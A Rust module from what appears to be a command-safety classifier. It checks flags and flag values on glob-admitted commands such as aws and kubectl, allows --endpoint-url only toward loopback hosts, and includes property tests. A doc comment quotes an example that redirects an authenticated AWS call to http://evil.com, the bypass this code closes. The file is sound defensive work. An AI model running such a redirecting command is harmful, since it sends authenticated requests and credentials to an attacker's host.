//! The flag check for an invocation a `first_arg` glob admitted, out of `registry/mod.rs`.

use super::types::TomlSub;
use crate::parse::Token;

fn inherit(toml: &mut TomlSub, standalone: &[String], valued: &[String]) {
    let declared = !toml.first_arg_standalone.is_empty() || !toml.first_arg_valued.is_empty() || !toml.first_arg_loopback_valued.is_empty();
    let tolerant = toml.tolerate_unknown_short.unwrap_or(false) || toml.tolerate_unknown_long.unwrap_or(false);
    let own = !toml.standalone.is_empty() || !toml.valued.is_empty() || !toml.optional_valued.is_empty();
    if !toml.first_arg.is_empty() && own && !declared && !tolerant {
        toml.first_arg_standalone = toml.standalone.iter().chain(&toml.optional_valued).chain(standalone).cloned().collect();
        toml.first_arg_valued = toml.valued.iter().chain(valued).cloned().collect();
    }
}

pub(crate) fn inherit_sub_flags(mut toml: TomlSub) -> TomlSub {
    inherit(&mut toml, &[], &[]);
    toml
}

pub(crate) fn flag_values(parent: &str, name: &str, toml: &TomlSub) -> Result<Vec<(String, Vec<String>)>, String> {
    let mut out: Vec<(String, Vec<String>)> = toml.flag_values.iter().map(|(f, v)| (f.clone(), v.clone())).collect();
    out.sort();
    for (flag, values) in &out {
        if !toml.valued.iter().chain(&toml.first_arg_valued).any(|f| f == flag) || values.is_empty() {
            return Err(format!(
                "command '{parent}' sub `{name}` lists `{flag}` in `flag_values` without it in `valued`, or with no values"
            ));
        }
    }
    Ok(out)
}

fn flag_value<'a>(tokens: &'a [Token], idx: usize, flag: &str) -> Option<Option<&'a str>> {
    let s = tokens[idx].as_str();
    let rest = if s == flag {
        ""
    } else if let Some(v) = s.strip_prefix(flag).and_then(|r| r.strip_prefix('=')) {
        return Some(Some(v));
    } else {
        let c = flag.strip_prefix('-').filter(|c| c.len() == 1 && !s.starts_with("--") && s.starts_with('-'))?;
        &s[s[1..].find(c)? + 2..]
    };
    if rest.is_empty() {
        return Some(tokens.get(idx + 1).map(Token::as_str));
    }
    Some(Some(rest.strip_prefix('=').unwrap_or(rest)))
}

pub(crate) fn value_outside(tokens: &[Token], values: &[(String, Vec<String>)]) -> bool {
    let allowed = |v: &str, choices: &[String]| choices.iter().any(|c| c.strip_suffix('*').map_or(v == c, |p| v.starts_with(p)));
    for idx in 0..tokens.len() {
        if tokens[idx] == "--" {
            break;
        }
        for (flag, choices) in values {
            if let Some(value) = flag_value(tokens, idx, flag)
                && !value.is_some_and(|v| allowed(v, choices))
            {
                return true;
            }
        }
    }
    false
}

fn short_cluster_known(s: &str, standalone: &[String], valued: &[String]) -> bool {
    for c in s[1..].chars() {
        let flag = format!("-{c}");
        if valued.contains(&flag) {
            return true;
        }
        if !standalone.contains(&flag) {
            return false;
        }
    }
    true
}

pub(crate) fn gated(
    tokens: &[Token],
    sub: &super::types::SubSpec,
    dispatch: impl FnOnce() -> crate::verdict::Verdict,
) -> crate::verdict::Verdict {
    if value_outside(tokens.get(1..).unwrap_or_default(), &sub.flag_values) { crate::verdict::Verdict::Denied } else { dispatch() }
}

pub(crate) fn with_wrapper_flags(mut subs: Vec<TomlSub>, standalone: &[String], valued: &[String]) -> Vec<TomlSub> {
    for sub in &mut subs {
        sub.sub = with_wrapper_flags(std::mem::take(&mut sub.sub), standalone, valued);
        inherit(sub, standalone, valued);
    }
    subs
}

/// Whether an invocation admitted by a `first_arg` GLOB carries a flag the family never declared.
///
/// The glob path used to allow on the strength of the first positional alone and never look at the
/// remaining tokens, so `aws kms get-public-key --endpoint-url http://evil.com` classified as an
/// ordinary read while redirecting an authenticated call to an arbitrary host. The verb claim
/// (`get-*` means read) is sound and stays; the flags are what needed a list.
///
/// An UNDECLARED family (both lists empty) keeps the old permissive behavior — the 240-odd AWS
/// service groups cannot be researched at once, and denying them wholesale would break every AWS
/// read. `no_new_unresearched_first_arg_family` in `tests.rs` pins the un-migrated set so the pile
/// cannot grow.
///
/// Non-flag tokens pass: some glob families take positionals (`kubectl get pods`), and the sensitive
/// ones are already caught earlier by `credential_first_arg`.
pub(crate) fn glob_presents_unlisted_flag(
    tokens: &[Token],
    skip: usize,
    standalone: &[String],
    valued: &[String],
    loopback_valued: &[String],
) -> bool {
    if standalone.is_empty() && valued.is_empty() && loopback_valued.is_empty() {
        return false;
    }
    let known = |f: &str| standalone.iter().any(|a| a == f) || valued.iter().any(|a| a == f);
    for (idx, t) in tokens.iter().enumerate().skip(skip) {
        let s = t.as_str();
        if s == "--" {
            break;
        }
        if !s.starts_with('-') || s == "-" || crate::cst::opaque::probe_is_value(tokens, idx, valued) {
            continue;
        }
        let head = s.split_once('=').map_or(s, |(f, _)| f);
        // A loopback-gated flag is admitted only when its VALUE names this machine. `--endpoint-url
        // http://localhost:8000` is a developer talking to their own service; the same flag pointed
        // anywhere else redirects an authenticated request. A missing value denies — the flag is
        // meaningless without one and guessing would be the fail-open direction.
        if loopback_valued.iter().any(|a| a == head) {
            let value = match s.split_once('=') {
                Some((_, v)) => Some(v),
                None => tokens.get(idx + 1).map(Token::as_str),
            };
            if value.is_some_and(crate::netloc::is_loopback) {
                continue;
            }
            return true;
        }
        if known(head) {
            continue;
        }
        if !s.starts_with("--") && s.len() > 2 && short_cluster_known(s, standalone, valued) {
            continue;
        }
        return true;
    }
    false
}

#[cfg(test)]
mod tests {
    use super::*;
    use proptest::prelude::*;

    fn tokens(words: &[String]) -> Vec<Token> {
        words.iter().cloned().map(Token::from_raw).collect()
    }

    proptest! {
        /// An undeclared family refuses nothing, whatever the line holds.
        #[test]
        fn an_undeclared_family_refuses_nothing(words in proptest::collection::vec("-{0,2}[a-z=]{0,6}", 0..6)) {
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&words), 0, &[], &[], &[]));
        }

        /// Only a flag the family did not declare refuses: adding it to the list clears it, and
        /// anything after `--` is never a flag.
        #[test]
        fn only_an_undeclared_flag_refuses(flag in "--[a-z]{1,8}", declared in "--[a-z]{1,8}", rest in proptest::collection::vec("[a-z]{0,6}", 0..3)) {
            let mut line = vec!["get-x".to_string(), flag.clone()];
            line.extend(rest.iter().cloned());
            let listed = [declared.clone()];
            prop_assert_eq!(glob_presents_unlisted_flag(&tokens(&line), 1, &listed, &[], &[]), flag != declared);
            let both = [declared, flag.clone()];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&line), 1, &both, &[], &[]));
            let after = vec!["get-x".to_string(), "--".to_string(), flag];
            prop_assert!(!glob_presents_unlisted_flag(&tokens(&after), 1, &listed, &[], &[]));
        }

        /// A flag's value is judged the same in every spelling, and only a listed value passes.
        #[test]
        fn a_value_is_judged_alike_in_every_spelling(value in "(json|jsonpath=[a-z]{0,4}|[a-z][a-z=-]{0,8})", lead in "[a-z]{0,3}") {
            let choices = vec![("--output".to_string(), vec!["json".to_string(), "jsonpath=*".to_string()]), ("-o".to_string(), vec!["json".to_string(), "jsonpath=*".to_string()])];
            let listed = value == "json" || value.starts_with("jsonpath=");
            let forms = [
                vec![lead.clone(), "-o".to_string(), value.clone()],
                vec![lead.clone(), format!("-o={value}")],
                vec![lead.clone(), format!("-o{value}")],
                vec![lead.clone(), "-Ao".to_string(), value.clone()],
                vec![lead.clone(), format!("-Ao{value}")],
                vec![lead.clone(), "--output".to_string(), value.clone()],
                vec![lead.clone(), format!("--output={value}")],
            ];
            for form in &forms {
                prop_assert_eq!(value_outside(&tokens(form), &choices), !listed, "{:?}", form);
            }
            prop_assert!(value_outside(&tokens(&[lead.clone(), "-o".to_string()]), &choices));
            prop_assert!(!value_outside(&tokens(&[lead, "--".to_string(), "-o".to_string(), value]), &choices));
        }
    }
}
